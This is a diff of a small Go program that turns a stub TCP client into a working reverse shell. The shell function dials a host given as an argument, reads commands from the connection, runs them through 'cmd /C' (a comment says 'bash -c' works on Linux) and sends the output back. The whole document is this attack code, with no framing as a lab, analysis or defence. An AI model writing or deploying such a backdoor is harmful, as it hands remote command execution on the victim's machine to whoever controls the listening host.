@@ -1,9 +1,11 @@
 package main
 
 import (
-	"fmt"
+	"bufio"
+	"log"
 	"net"
 	"os"
+	"os/exec"
 )
 
 var arg = os.Args[1]
@@ -17,9 +19,15 @@ func main() {
 func shell(host string) {
 	conn, err := net.Dial("tcp", host)
 	if err != nil {
-		fmt.Println(err)
-	} else if conn != nil {
-		fmt.Println(&conn)
+		log.Fatal(err)
 	}
-	// TODO: Need to send some data through the conn object.
+
+	for {
+		message, _ := bufio.NewReader(conn).ReadString('\n')
+		out, err := exec.Command("cmd", "/C", message).CombinedOutput() // for linux, switch "cmd" to "bash" and "/C" to "-c"
+		if err != nil {
+			log.Fatal(err)
+		}
+		conn.Write(out)
+	}
 }
